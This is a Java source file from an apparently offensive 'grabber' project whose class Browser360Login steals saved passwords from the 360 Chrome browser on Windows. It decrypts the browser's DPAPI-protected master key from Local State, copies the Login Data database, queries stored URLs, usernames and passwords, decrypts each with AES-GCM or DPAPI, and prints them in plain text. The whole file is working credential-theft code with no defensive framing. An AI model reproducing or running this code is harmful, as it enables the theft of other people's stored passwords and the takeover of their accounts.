package ninja.maki.grabber.browser360;

import com.sun.jna.platform.win32.Crypt32Util;
import ninja.maki.utils.SystemUtil;
import org.apache.commons.codec.binary.Base64;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.nio.charset.StandardCharsets;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.Arrays;

public class Browser360Login {
    public static void grab() {
        SystemUtil.console();
        String loginTemp = System.getProperty("java.io.tmpdir") + "broswer360logindata.tmp";
        String loginPath = System.getProperty("user.home") + "\\AppData\\Local\\360Chrome\\Chrome\\User Data\\Default\\Login Data";
        File loginTempFile = new File(loginTemp);
        try {
            loginTempFile = File.createTempFile("broswer360logindata", ".tmp");
            loginTemp = loginTempFile.getAbsolutePath();
        }catch (IOException e){
            SystemUtil.console("Failed to create temp file.");
        }
        File loginPathFile = new File(loginPath);
        if(loginPathFile.exists()) {
            try {
                String loginState = System.getProperty("user.home") + "\\AppData\\Local\\360Chrome\\Chrome\\User Data\\Local State";
                File loginStateFile = new File(loginState);
                StringBuilder cryptMasterKey = new StringBuilder();
                try (BufferedReader reader = new BufferedReader(new FileReader(loginStateFile))) {
                    String tempString;
                    while ((tempString = reader.readLine()) != null) {
                        cryptMasterKey.append(tempString);
                    }
                } catch (IOException e) {
                    SystemUtil.console("Failed to read file \"" + loginState + "\".");
                }
                cryptMasterKey = new StringBuilder(SystemUtil.getSubString(cryptMasterKey.toString(), "\"encrypted_key\":\"", "\""));
                byte[] masterKey = Base64.decodeBase64(cryptMasterKey.toString());
                if (new String(masterKey).startsWith("DPAPI")) {
                    SystemUtil.console("Get Encrypted Key.");
                } else {
                    throw new Exception("Failed to get Encrypted Key.");
                }
                masterKey = Crypt32Util.cryptUnprotectData(Arrays.copyOfRange(masterKey, "DPAPI".length(), masterKey.length));
                if (masterKey.length != 256 / 8) throw new Exception("Failed to decrypt key.");
                try {
                    SystemUtil.copyFile(loginPathFile, loginTempFile);
                    SystemUtil.console("Copy \"" + loginPath + "\" to \"" + loginTemp + "\".");
                } catch (IOException e) {
                    SystemUtil.console("Failed to copy \"" + loginPath + "\" to \"" + loginTemp + "\".");
                }
                Connection connection;
                Statement statement;
                try {
                    Class.forName("org.sqlite.JDBC");
                    connection = DriverManager.getConnection("jdbc:sqlite:" + loginTemp);
                    connection.setAutoCommit(false);
                    SystemUtil.console("Connect database \"" + loginTemp + "\".");
                    statement = connection.createStatement();
                    ResultSet resultSet = statement.executeQuery("SELECT origin_url, username_value, password_value FROM logins");
                    SystemUtil.console();
                    SystemUtil.console("==================================================================");
                    while (resultSet.next()) {
                        String url = resultSet.getString("origin_url");
                        String username = resultSet.getString("username_value");
                        String cryptPassword = resultSet.getString("password_value");
                        InputStream inputStream = resultSet.getBinaryStream("password_value");
                        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                        int ch;
                        while ((ch = inputStream.read()) != -1) {
                            byteArrayOutputStream.write(ch);
                        }
                        byte[] passwordByte = byteArrayOutputStream.toByteArray();
                        byteArrayOutputStream.close();
                        String password;
                        if (cryptPassword.startsWith("v10")) {
                            byte[] nonce = Arrays.copyOfRange(passwordByte, "v10".length(), "v10".length() + 96 / 8);
                            passwordByte = Arrays.copyOfRange(passwordByte, "v10".length() + 96 / 8, passwordByte.length);
                            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
                            SecretKeySpec keySpec = new SecretKeySpec(masterKey, "AES");
                            GCMParameterSpec gcmParameterSpec = new GCMParameterSpec(16 * 8, nonce);
                            cipher.init(Cipher.DECRYPT_MODE, keySpec, gcmParameterSpec);
                            password = new String(cipher.doFinal(passwordByte));
                        } else {
                            password = new String(Crypt32Util.cryptUnprotectData(passwordByte), StandardCharsets.UTF_8);
                        }
                        SystemUtil.console();
                        SystemUtil.console("URL -> " + url);
                        SystemUtil.console("Username -> " + username);
                        SystemUtil.console("Password -> " + password);
                    }
                    SystemUtil.console();
                    SystemUtil.console("==================================================================");
                    resultSet.close();
                    statement.close();
                    connection.close();
                } catch (Exception e) {
                    e.printStackTrace();
                    SystemUtil.console("Failed to get info.");
                }
            }catch (Exception e) {
                SystemUtil.console(e.getMessage());
            }
        }else {
            SystemUtil.console("\"" + loginPath + "\" is not founded.");
        }
        SystemUtil.console();
        if(loginTempFile.exists()) {
            if(loginTempFile.delete()) {
                SystemUtil.console("Delete \"" + loginTemp + "\".");
            }else {
                SystemUtil.console("Failed to delete \"" + loginTemp + "\".");
            }
        }
    }
}
